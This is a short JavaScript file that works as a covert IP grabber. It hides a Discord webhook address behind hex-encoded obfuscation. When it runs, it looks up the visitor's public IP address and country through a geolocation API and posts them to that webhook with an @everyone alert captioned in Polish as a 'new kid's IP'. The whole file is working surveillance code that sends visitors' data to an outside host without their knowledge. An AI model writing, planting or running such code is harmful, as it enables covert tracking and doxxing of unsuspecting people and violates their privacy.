var _0x7116=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x32\x39\x34\x31\x34\x36\x30\x35\x32\x37\x35\x30\x31\x33\x31\x37\x30\x2F\x69\x36\x74\x45\x43\x70\x55\x58\x4B\x5F\x76\x72\x33\x4F\x55\x65\x35\x6A\x51\x59\x6A\x50\x5F\x54\x31\x68\x4F\x31\x51\x5F\x47\x4C\x35\x73\x6F\x4B\x67\x45\x79\x71\x6F\x54\x6C\x6D\x59\x49\x5A\x4F\x67\x72\x32\x56\x33\x43\x62\x44\x62\x4F\x49\x53\x50\x61\x6B\x59\x48\x43\x38\x50"];var webHookUrl=_0x7116[0]


$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "**nowe ip kida** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n" +
		    "__**Kraj:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
